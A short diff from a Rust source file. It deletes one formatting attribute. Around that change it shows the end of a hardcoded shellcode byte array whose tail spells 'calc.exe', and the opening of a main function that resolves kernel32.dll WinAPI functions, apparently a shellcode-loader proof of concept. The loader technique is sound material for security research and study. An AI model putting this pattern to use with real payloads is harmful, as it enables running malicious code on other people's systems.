@@ -18,7 +18,6 @@ const SHELLCODE: [u8; 276] = [
     0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
 ];
 
-#[rustfmt::skip]
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Resolves addresses of the WinAPI functions to be used
     let kernel32 = GetModuleHandle("kernel32.dll", None);
